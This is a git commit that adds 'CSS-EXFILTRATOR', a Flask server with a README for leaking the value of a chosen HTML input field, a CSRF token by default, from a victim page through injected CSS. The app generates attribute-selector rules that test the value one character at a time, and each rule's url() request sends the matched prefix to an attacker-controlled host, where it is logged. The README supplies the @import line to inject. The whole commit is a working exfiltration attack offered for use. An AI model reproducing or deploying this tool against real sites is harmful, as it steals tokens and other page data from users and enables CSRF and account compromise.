f3a7d1e887400d365d131fc220ff9946a9b035b1
LOLOLEKIK <loris.thiebaut@gmail.com>
2025-01-12 11:41:16 +0000

    tool done

--- README.md
+++ README.md
@@ -1,2 +1,33 @@
 # CSS-EXFILTRATOR
 easy to use (really)
+
+Easy script to target and exfiltrate one tag.
+
+## How to launch
+
+Very easy.
+
+```
+docker compose up --build
+```
+
+## How to configure ?
+
+Very easy.
+
+in app.py you can change 
+
+attacker_url: by your protocol://ip:port
+target_balise: tag you want to target (input with csrf ?)
+size_of_field_to_brute: max size you need to search for your tag
+entry_point: first endpoint where the script needs to listen (leave start if you have no constraints on the application you're attacking)
+
+## How to use ?
+
+Very easy.
+
+`@import '<PROTOCOL>://<IP:PORT>/<ENTRY_POINT>';`
+
+## Where is result ?
+
+You can find it easily in the log flasks.
---
+++ src/app.py
@@ -0,0 +1,72 @@
+# Script use for css exfiltration
+from flask import Flask, request
+import string
+import datetime
+import time
+
+app = Flask(__name__)
+
+startbalise = 'html:has('
+
+######### CHANGE BY YOUR IP AND THE BALISE TO EXFILTRATE (ONLY ONE BALISE) ###########
+attacker_url = 'http://<IP>:5001'
+target_balise = 'input[type="text"][name="csrf"]'
+size_of_field_to_brute = 100
+entry_point = '/start.css'
+######################################################################################
+
+
+balise =  startbalise + target_balise
+all_data =''
+
+
+def generate_css(balise, data):
+    app.logger.info(f"[-] Generate css with data: {data} ...")
+    z = len(data) + 1
+    css = ''
+    now = datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')  # Timestamp unique
+    css += f'@import "{attacker_url}/launch/data?v={z}-{now}";\n\n'
+    startcommand = f"{balise}"
+    alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits  
+    for i in range(0, len(alphabet)):
+        brute = f"{data}{alphabet[i]}"
+        css += f"{startcommand}[value^='{brute}'])\n{{\n\t--value-{z}: url('{attacker_url}/extract/{brute}?v={z}');\n}}\n\n"
+    return css
+
+
+@app.route(entry_point, methods=['GET'])
+def index():
+    app.logger.info("[+] New exfiltration started")
+    css = f'@import "{attacker_url}/extract/start";\n'
+    all_variable = ''
+    for i in range(1, size_of_field_to_brute):
+        all_variable += f' var(--value-{i},none),'
+    css += f"\n*{{\n\tbackground: {all_variable[:-1]} ;\n}}"
+    return css, 200, {'Content-Type': 'text/css'}
+
+
+@app.route('/extract/<data>', methods=['GET'])
+def css(data):
+    global all_data 
+    app.logger.info(f"[+] New data recieved: {data}")
+    if data == "start":
+        data = ''
+        all_data = ''
+        css = generate_css(balise, data)
+        return css, 200, {'Content-Type': 'text/css'}
+    all_data = data
+    img_data = open('img.jpeg', 'rb').read()
+    return img_data, 200, {'Content-Type': 'image/jpeg'}
+
+
+@app.route('/launch/<data>', methods=['GET'])
+def launch(data):
+    global all_data  # Declare the global variable
+    # read file in folder
+    css = generate_css(balise, all_data)
+    return css, 200, {'Content-Type': 'text/css'}
+
+        
+
+if __name__=='__main__':
+    app.run(host="0.0.0.0", port=5000)
